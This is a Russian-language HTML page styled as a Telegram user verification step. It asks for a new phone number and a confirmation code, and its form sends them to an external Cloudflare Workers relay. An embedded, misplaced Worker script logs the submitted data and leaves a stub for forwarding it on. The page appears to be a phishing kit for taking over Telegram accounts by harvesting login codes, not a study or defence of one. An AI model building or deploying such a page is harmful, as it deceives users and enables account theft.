<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка пользователя Телеграмм</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .tg-icon {
            font-size: 36px;
            color: #0074b9;
            margin-bottom: 20px;
        }

        h1 {
            margin-top: 0;
        }

        form {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
        }

        label {
            margin-top: 10px;
        }

        input {
            margin-bottom: 10px;
            padding: 5px;
            width: calc(100% - 10px);
        }

        button {
            margin-top: 10px;
            padding: 10px;
            width: 100%;
        }
    </style>
</head>
<body>

    <!-- Голубая иконка с надписью TG -->
    <div class="tg-icon">TG</div>

    <!-- Название страницы -->
    <h1>Проверка пользователя Телеграмм</h1>

    <form action="https://tg-relay.egor8131723.workers.dev" method="post">
        <label for="newPhone">Новый номер телефона:</label>
        <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
        <br>
        <label for="code">Код подтверждение:</label>
        <input type="number" id="code" name="code" placeholder="Код подтверждение" required>
        <br>
        <button id="sendBtn">Присоединиться</button>
    </form>

    <script>
        export default {
            async fetch(request, env, ctx) {
                // Заголовки CORS, чтобы браузер Mini App разрешил обмен данными
                const corsHeaders = {
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Allow-Methods": "POST, OPTIONS",
                    "Access-Control-Allow-Headers": "Content-Type",
                };

                // 1. Обязательно отвечаем статусом 200/204 на предварительный запрос браузера
                if (request.method === "OPTIONS") {
                    return new Response(null, { headers: corsHeaders });
                }

                // 2. Разрешаем только POST-запросы
                if (request.method !== "POST") {
                    return new Response("Method Not Allowed", {
                        status: 405,
                        headers: corsHeaders,
                    });
                }

                try {
                    // Читаем входящие данные от Mini App
                    const data = await request.json();
                    console.log("Получены данные:", data);

                    // Здесь ваша логика обработки (например, отправка в Telegram).

                    return new Response(JSON.stringify({ ok: true }), {
                        status: 200,
                        headers: {
                            "Content-Type": "application/json",
                            ...corsHeaders,
                        },
                    });
                } catch (err) {
                    return new Response(JSON.stringify({ error: err.message }), {
                        status: 400,
                        headers: {
                            "Content-Type": "application/json",
                            ...corsHeaders,
                        },
                    });
                }
            },
        };
    </script>

</body>
</html>
